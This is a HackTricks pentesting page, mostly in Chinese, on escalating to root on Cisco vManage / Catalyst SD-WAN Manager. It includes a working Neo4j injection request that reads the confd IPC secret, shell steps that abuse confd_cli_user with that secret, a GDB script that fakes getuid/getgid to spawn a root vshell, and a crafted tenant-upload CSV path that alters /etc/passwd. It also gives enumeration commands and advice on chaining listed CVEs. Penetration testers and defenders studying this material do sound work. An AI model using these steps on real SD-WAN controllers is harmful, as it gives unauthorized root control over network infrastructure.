# Cisco - vmanage

{{#include ../../banners/hacktricks-training.md}}

在 Cisco vManage / *Catalyst SD-WAN Manager* 上以 `vmanage`、`netadmin` 或 `vmanage-admin` 身份获得 code execution 后，最值得关注的本地 privesc 攻击面通常是 `confd` CLI stack、`cmdptywrapper` helper、localhost REST APIs，以及由 root 拥有的 import/upload handlers。

如果你仍需要在 controller 上取得 **initial foothold**，请先查看专门介绍 control-plane 的页面：

{{#ref}}
../../network-services-pentesting/12346-udp-pentesting-cisco-sd-wan-control-plane.md
{{#endref}}

## 快速本地排查
```bash
ps auxww | egrep 'confd|cmdptywrapper|neo4j|vdaemon'
ss -lntp | egrep '4565|830|8443'
find /run /var/run -maxdepth 2 -type s 2>/dev/null | egrep 'confd|cli|rest|mgmt'
ls -l /etc/confd/confd_ipc_secret /usr/bin/confd_cli /usr/bin/confd_cli_user
ls -la /home/vmanage-admin/.ssh 2>/dev/null
grep -R "tenant-upload\|tenant-list" /opt /usr 2>/dev/null | head
```
如果从你的 foothold 可以读取 `/etc/confd/confd_ipc_secret`，那么 Path 1 和 Path 2 就可以立即付诸实践。如果你是通过 remote info leak 或 webshell 进入的，还应检查是否已经能够访问 `vmanage-admin` SSH material 或 multitenancy upload handlers：2026 年的研究表明，这两者都是现实可行的 stepping stones。

## Path 1

（示例来自 [https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html)）<sup>[[5]](#references)</sup>

在查阅了一些与 `confd` 和不同 binaries 相关的[文档](http://66.218.245.39/doc/html/rn03re18.html)后（使用 Cisco 网站上的账号即可访问），我们发现，要对 IPC socket 进行认证，它会使用位于 `/etc/confd/confd_ipc_secret` 中的 secret：
```
vmanage:~$ ls -al /etc/confd/confd_ipc_secret

-rw-r----- 1 vmanage vmanage 42 Mar 12 15:47 /etc/confd/confd_ipc_secret
```
还记得我们的 Neo4j 实例吗？它正以 `vmanage` 用户的权限运行，因此我们可以利用之前的漏洞检索该文件：
```
GET /dataservice/group/devices?groupId=test\\\'<>\"test\\\\")+RETURN+n+UNION+LOAD+CSV+FROM+\"file:///etc/confd/confd_ipc_secret\"+AS+n+RETURN+n+//+' HTTP/1.1

Host: vmanage-XXXXXX.viptela.net



[...]

"data":[{"n":["3708798204-3215954596-439621029-1529380576"]}]}
```
`confd_cli` 程序不支持 command line arguments，但会带参数调用 `/usr/bin/confd_cli_user`。因此，我们可以直接使用自定义的参数集调用 `/usr/bin/confd_cli_user`。不过，以我们当前的权限无法读取该文件，所以必须从 rootfs 中获取它，并通过 scp 复制出来，读取帮助信息，然后利用它获取 shell：
```
vManage:~$ echo -n "3708798204-3215954596-439621029-1529380576" > /tmp/ipc_secret

vManage:~$ export CONFD_IPC_ACCESS_FILE=/tmp/ipc_secret

vManage:~$ /tmp/confd_cli_user -U 0 -G 0

Welcome to Viptela CLI

admin connected from 127.0.0.1 using console on vManage

vManage# vshell

vManage:~# id

uid=0(root) gid=0(root) groups=0(root)
```
## 路径 2

（示例来自 [https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77)）<sup>[[6]](#references)</sup>

synacktiv 团队的博客<sup>[[5]](#references)</sup>介绍了一种获取 root shell 的巧妙方法，但问题在于，这需要获取 `/usr/bin/confd_cli_user` 的副本，而该文件只有 root 才能读取。我找到了另一种无需这些麻烦即可提权至 root 的方法。

当我对 `/usr/bin/confd_cli` 二进制文件进行反汇编时，观察到了以下内容：

<details>
<summary>显示 UID/GID 收集的 Objdump</summary>
```asm
vmanage:~$ objdump -d /usr/bin/confd_cli
… snipped …
40165c: 48 89 c3              mov    %rax,%rbx
40165f: bf 1c 31 40 00        mov    $0x40311c,%edi
401664: e8 17 f8 ff ff        callq  400e80 <getenv@plt>
401669: 49 89 c4              mov    %rax,%r12
40166c: 48 85 db              test   %rbx,%rbx
40166f: b8 dc 30 40 00        mov    $0x4030dc,%eax
401674: 48 0f 44 d8           cmove  %rax,%rbx
401678: 4d 85 e4              test   %r12,%r12
40167b: b8 e6 30 40 00        mov    $0x4030e6,%eax
401680: 4c 0f 44 e0           cmove  %rax,%r12
401684: e8 b7 f8 ff ff        callq  400f40 <getuid@plt>  <-- HERE
401689: 89 85 50 e8 ff ff     mov    %eax,-0x17b0(%rbp)
40168f: e8 6c f9 ff ff        callq  401000 <getgid@plt>  <-- HERE
401694: 89 85 44 e8 ff ff     mov    %eax,-0x17bc(%rbp)
40169a: 8b bd 68 e8 ff ff     mov    -0x1798(%rbp),%edi
4016a0: e8 7b f9 ff ff        callq  401020 <ttyname@plt>
4016a5: c6 85 cf f7 ff ff 00  movb   $0x0,-0x831(%rbp)
4016ac: 48 85 c0              test   %rax,%rax
4016af: 0f 84 ad 03 00 00     je     401a62 <socket@plt+0x952>
4016b5: ba ff 03 00 00        mov    $0x3ff,%edx
4016ba: 48 89 c6              mov    %rax,%rsi
4016bd: 48 8d bd d0 f3 ff ff  lea    -0xc30(%rbp),%rdi
4016c4:   e8 d7 f7 ff ff           callq  400ea0 <*ABS*+0x32e9880f0b@plt>
… snipped …
```
</details>

当我运行“ps aux”时，我观察到以下内容（_注意 -g 100 -u 107_）
```
vmanage:~$ ps aux
… snipped …
root     28644  0.0  0.0   8364   652 ?        Ss   18:06   0:00 /usr/lib/confd/lib/core/confd/priv/cmdptywrapper -I 127.0.0.1 -p 4565 -i 1015 -H /home/neteng -N neteng -m 2232 -t xterm-256color -U 1358 -w 190 -h 43 -c /home/neteng -g 100 -u 1007 bash
… snipped …
```
我推测“confd_cli”程序会将其从已登录用户处获取的用户 ID 和组 ID 传递给“cmdptywrapper”应用程序。

我第一次尝试直接运行“cmdptywrapper”，并向其提供 `-g 0 -u 0`，但失败了。过程中似乎在某处创建了一个文件描述符（-i 1015），而我无法伪造它。

如 synacktiv 的 blog（最后一个示例）中所述，`confd_cli` 程序不支持 command line argument，但我可以通过 debugger 对其施加影响，幸运的是，系统中包含 GDB。

我创建了一个 GDB script，强制 API `getuid` 和 `getgid` 返回 0。由于我已经通过 deserialization RCE 获得了“vmanage”权限，因此可以直接读取 `/etc/confd/confd_ipc_secret`。

root.gdb:
```
set environment USER=root
define root
finish
set $rax=0
continue
end
break getuid
commands
root
end
break getgid
commands
root
end
run
```
控制台输出：

<details>
<summary>控制台输出</summary>
```text
vmanage:/tmp$ gdb -x root.gdb /usr/bin/confd_cli
GNU gdb (GDB) 8.0.1
Copyright (C) 2017 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-poky-linux".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from /usr/bin/confd_cli...(no debugging symbols found)...done.
Breakpoint 1 at 0x400f40
Breakpoint 2 at 0x401000Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401689 in ?? ()Breakpoint 2, getgid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401694 in ?? ()Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401871 in ?? ()
Welcome to Viptela CLI
root connected from 127.0.0.1 using console on vmanage
vmanage# vshell
bash-4.4# whoami ; id
root
uid=0(root) gid=0(root) groups=0(root)
bash-4.4#
```
</details>

## 路径 3（2025 CLI 输入验证 bug - CVE-2025-20122）

Cisco later documented a cleaner local root path in its own advisory for [CVE-2025-20122](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-priviesc-WCk7bmmt): an **authenticated attacker with only read-only privileges** could send a crafted request to the manager CLI and jump to root because of insufficient input validation.<sup>[[7]](#references)</sup>

从 offensive perspective 来看，重要结论如下：

1. Once you have *any* low-priv foothold on the box, you should test the local CLI service before going for the heavier Path 1 / Path 2 workflow.
2. Reuse the artifacts from Path 2 to find the trust boundary: `confd_cli` → `cmdptywrapper` → `vshell`.
3. Treat every field forwarded to the CLI backend as suspicious: UID/GID, username, terminal metadata, imported files, or any value later consumed by a root-owned helper.
4. If a low-priv user can reach the local CLI socket and influence those fields, root may be only one crafted request away.

A practical workflow after landing on the appliance is:
```bash
strings /usr/bin/confd_cli | egrep 'cmdptywrapper|vshell|confd'
strace -f -s 200 -o /tmp/confd.trace /usr/bin/confd_cli
ss -lntp | grep 4565
```
这使得 2025 年的 bug 成为一种很好的 hunting pattern，可用于寻找类似版本：查找**在 userland 中收集身份信息，并将其转发给权限更高的 wrapper 的本地 CLI shim**。

不要将 **CVE-2025-20122** 与后来的 **CVE-2026-20122** 混淆：2025 年的问题是一个*本地* CLI-to-root bug，而 2026 年的问题是一个*远程* API arbitrary file overwrite，主要用于植入 foothold，然后再次检查 Path 1 / Path 2 / Path 4。

## Path 4（2026 low-priv REST API to root - CVE-2026-20126）

Cisco 在 2026 年 2 月的 advisory 中还介绍了另一类有用的 privesc：[CVE-2026-20126](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v) 由于 REST API 中存在不足的 user-authentication 机制，使**拥有 authenticated 身份的本地 low-priv attacker**能够获得 root 权限。<sup>[[1]](#references)</sup>

这很重要，因为 vManage privesc 已不再局限于 `confd`/TTY abuse。获得 low-priv shell 后，还应继续寻找：

- 过度信任调用者的 localhost-only API endpoints
- 当前账户可读取的 tokens、cookies 或 service credentials
- 通过 `dataservice`/REST handlers 暴露、且仍可在本地触发的 root-only actions

实践中，一旦获得 `vmanage` 或其他 service user 的 shell，本地 API abuse 通常比交互式 CLI abuse 更安静，也更容易自动化：
```bash
env | grep -iE 'token|cookie|session'
grep -R "dataservice" /etc /opt 2>/dev/null | head
ss -lntp | grep -E '(:443|:8443)'
```
如果本地 session context 足以访问特权 REST 功能，优先选择 API 路径：它更容易 replay、script，并与窃取的 web sessions 或 API tokens 进行链式利用。

## 路径 5（2026 年由 root 处理 crafted file - CVE-2026-20245）

另一个近期模式是 [CVE-2026-20245](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx)：具有 `netadmin` 权限的本地攻击者可以上传一个**crafted file**，之后 CLI 会以不安全的方式处理该文件，最终以 `root` 身份实现 command injection。<sup>[[2]](#references)</sup>

从 HackTricks 的角度来看，有价值的技术并不局限于特定 CVE：

1. 枚举所有接受文件的 CLI 或 web workflow：imports、diagnostic bundles、templates、validators、backups、tenant data 等。
2. 跟踪上传的文件落在哪里，以及哪个由 root 拥有的 script 或 binary 会使用它。
3. 测试文件名、文件内容或解析后的 metadata 是否曾被传递给 shell commands、wrapper scripts 或 `system()`-style helpers。
4. 如果你已经可以获得 `netadmin` 权限（有效 creds、窃取的 session，或 auth-bypass chain），file-processing bugs 通常是获得 root 的最快路径。

Google Cloud / Mandiant 后来展示了这一 bug class 的一个非常具体的实例：攻击者通过 multitenancy import path 利用了该漏洞。<sup>[[4]](#references)</sup>
```bash
request tenant-upload tenant-list /home/admin/evil_tenant.csv vpn 0
```
在观察到的攻击中，精心构造的 CSV 最终修改了 `/etc/passwd` 和 `/etc/shadow`，从而创建了一个临时的 UID 0 账户（`troot`）。<sup>[[4]](#references)</sup> 这使得 `tenant-upload` / `tenant-list` 类的导入器尤其值得关注：它们不仅是 data-ingestion 功能，还可能是由 root 拥有权限的 parser 前端。

一个快速的 shell-side hunting pattern 是：
```bash
strings /usr/bin/* 2>/dev/null | grep -E 'tenant-upload|tenant-list|import|upload|backup' | head
grep -R "tenant-upload\|tenant-list" /opt /usr 2>/dev/null | head
```
此类漏洞与授予 `netadmin` 但不授予 `root` 权限的远程 foothold 尤其适合进行 chain。

## 近期可与 vManage/Catalyst SD-WAN Manager 漏洞进行 chain 的其他漏洞

- **Unauthenticated info leak (CVE-2026-20133)** – 其价值尤其高，因为公开研究表明，它可以暴露 `confd_ipc_secret` 或 `vmanage-admin` private key，从而将 read bug 转变为 Path 1 或 NETCONF pivot。<sup>[[3]](#references)</sup>
- **Authenticated API arbitrary file overwrite (CVE-2026-20122)** – 与上文的 2025 CLI bug 不同；VulnCheck 利用它上传了 webshell，随后本页面中的 local privesc 路径便可立即发挥作用。<sup>[[3]](#references)</sup>
- **Authenticated UI XSS (CVE-2024-20475)** – 窃取 web UI 中的 admin session，然后 pivot 到 API/CLI actions，最终到达 `vshell` 或上面的某条 local privesc 路径。
- **Remote auth bypass to `netadmin` (CVE-2026-20129)** – 这是 Path 5 的非常强的 precursor，因为 `netadmin` 正是 2026 crafted-file privesc 所要求的权限级别。<sup>[[3]](#references)</sup>
- **Authenticated arbitrary file write (CVE-2026-20262)** – 与 CVE-2026-20122 具有类似的 offensive value，但利用的是后续 web UI upload path：将文件写入稍后会被 root 或 management-plane web tier 解析的位置。
- **Downgrade to resurrect old CLI privesc (CVE-2022-20775)** – 2026 年的 intrusions 表明，攻击者可以回滚到旧的、存在漏洞的 SD-WAN build，利用旧 CLI root bug，然后恢复原始版本。<sup>[[8]](#references)</sup>
- **Pre-auth control-plane auth bypass (CVE-2026-20182)** – 专门的 SD-WAN control-plane 页面对此有更详细的说明；它可以为 `vmanage-admin` 追加 SSH key，从而提供重新查看本页面所需的 local foothold。



## References

- [1] [Cisco Catalyst SD-WAN Vulnerabilities (CVE-2026-20126, CVE-2026-20129, etc.)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v)
- [2] [Cisco Catalyst SD-WAN Controller, Catalyst SD-WAN Manager, and Catalyst SD-WAN Validator Authenticated Privilege Escalation Vulnerability (CVE-2026-20245)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx)
- [3] [VulnCheck: Herding Cats - Recent Cisco SD-WAN Manager Vulnerabilities](https://www.vulncheck.com/blog/cisco-sd-wan-manager-vulns)
- [4] [Google Cloud / Mandiant: Zero-Day Exploitation of Vulnerability (CVE-2026-20245) in Cisco Catalyst SD-WAN Manager](https://cloud.google.com/blog/topics/threat-intelligence/zero-day-exploitation-cisco-catalyst-sd-wan-manager)
- [5] [Pentesting Cisco SD-WAN Part 1: Attacking vManage](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html)
- [6] [Hacking Cisco SD-WAN vManage 19.2.2 — From CSRF to Remote Code Execution](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77)
- [7] [Cisco Catalyst SD-WAN Manager Privilege Escalation Vulnerability (CVE-2025-20122)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-priviesc-WCk7bmmt)
- [8] [Active exploitation of Cisco Catalyst SD-WAN by UAT-8616 (Cisco Talos)](https://blog.talosintelligence.com/uat-8616-sd-wan/)

{{#include ../../banners/hacktricks-training.md}}
